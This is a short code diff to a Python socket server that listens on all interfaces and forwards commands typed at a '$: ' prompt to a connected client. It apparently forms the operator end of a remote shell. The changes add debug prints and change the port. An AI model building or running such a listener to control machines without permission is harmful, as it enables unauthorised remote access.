@@ -71,15 +71,18 @@ class s_sock:
     def send_msg(self, message):
         
         self.conn.send(message.encode())
+        
+        print(f"Message being sent: {message}")
+        print("waiting on recieve message")  
         recieve_msg = self.conn.recv(1024).decode() ## was 10000
         
         if recieve_msg == None:
-            self.conected = False
+            print("ERR")
+            #self.conected = False
         
-        #print("HI")  
+
           ## why are you still encoded
-        recieve_msg = str(recieve_msg)
-        #print(recieve_msg) 
+        print(f"Message: {recieve_msg}") 
         return recieve_msg
     
     
@@ -153,7 +156,7 @@ class s_action:
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    SERV.start_server('0.0.0.0',8082)
+    SERV.start_server('0.0.0.0',8088)
     while True:
         shellcommand = input("$: ")
         SERV.send_msg(shellcommand)
